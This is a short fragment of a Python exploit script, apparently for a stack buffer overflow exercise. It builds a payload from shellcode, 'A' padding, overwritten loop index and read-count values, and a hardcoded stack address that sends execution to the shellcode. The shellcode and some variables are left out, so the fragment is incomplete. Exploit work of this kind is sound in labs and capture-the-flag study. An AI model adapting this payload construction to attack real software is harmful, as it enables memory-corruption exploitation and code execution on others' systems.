...
buf_addr = "\x10\xe2\xff\xff\xff\x7f\x00\x00" #"\x00\x00\x7f\xff\xff\xff\xe2\x50" 
byte_read2 = "\x40\x00\x00\x00"
byte_read1 = "\x40\x00\x00\x00"
idx =  "\x5c\x00\x00\x00" # this will not jump to index 80 because of ++ at the end of the loop
...
text = shellcode + "A" * (64 - len(shellcode)) + "A" * 12 + idx2 + idx1 + byte_read2 + byte_read1 + idx + "A" * 8 + buf_addr
print(len(text))
